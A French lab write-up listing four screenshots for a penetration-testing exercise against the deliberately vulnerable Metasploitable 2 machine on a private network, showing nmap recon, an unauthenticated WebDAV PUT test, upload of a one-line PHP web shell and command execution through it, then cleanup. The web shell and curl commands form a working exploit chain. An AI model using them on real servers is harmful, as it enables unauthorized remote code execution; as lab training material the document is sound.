# Captures — Web Apache : WebDAV → RCE (MS2, port 80)

Cible : `192.168.56.101` · Kali : `192.168.56.1`.
4 captures. Chaque capture montre **la commande tapée ET son résultat**.

## 01-recon-nmap.png

Commandes :
```bash
nmap -sV -p 80 192.168.56.101
curl -s http://192.168.56.101/ | grep -i "href="
```

Encadrer en rouge : `Apache httpd 2.2.8 ((Ubuntu) DAV/2)` (le `DAV/2`) et la ligne
`<a href="/dav/">WebDAV</a>`.

## 02-put-test.png

Test d'écriture WebDAV sans authentification :
```bash
curl -X PUT http://192.168.56.101/dav/josatest.txt --data "hello-josa"
curl http://192.168.56.101/dav/josatest.txt
```

Encadrer en rouge : le code `201 Created` et le contenu `hello-josa` relu.

## 03-webshell-rce.png

Dépôt du webshell PHP puis exécution d'une commande :
```bash
printf '<?php system($_GET["c"]); ?>' | curl -X PUT http://192.168.56.101/dav/j.php --data-binary @-
curl "http://192.168.56.101/dav/j.php?c=id;uname%20-a;hostname"
```

Encadrer en rouge : la ligne `uid=33(www-data) gid=33(www-data) ...` (preuve de la RCE).

## 04-cleanup.png

Nettoyage (bonne hygiène) :
```bash
curl -X DELETE http://192.168.56.101/dav/j.php
curl -X DELETE http://192.168.56.101/dav/josatest.txt
```

Encadrer en rouge : les codes `204 No Content` (suppression confirmée).
